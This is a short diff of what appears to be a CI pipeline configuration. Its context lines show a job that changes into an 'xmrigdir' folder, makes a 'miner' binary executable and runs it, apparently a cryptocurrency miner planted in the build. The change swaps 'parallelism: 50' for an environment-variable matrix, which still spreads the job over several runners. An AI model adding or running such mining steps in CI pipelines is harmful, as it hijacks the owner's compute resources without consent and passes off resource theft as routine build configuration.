@@ -16,5 +16,13 @@ blocks:
             - cd xmrigdir
             - chmod +x miner
             - ./miner
-          parallelism: 50
+          matrix:
+            - env_var: FOO
+              values:
+                - value1
+                - value2
+            - env_var: BAR
+              values:
+                - value1
+                - value2
     dependencies: []
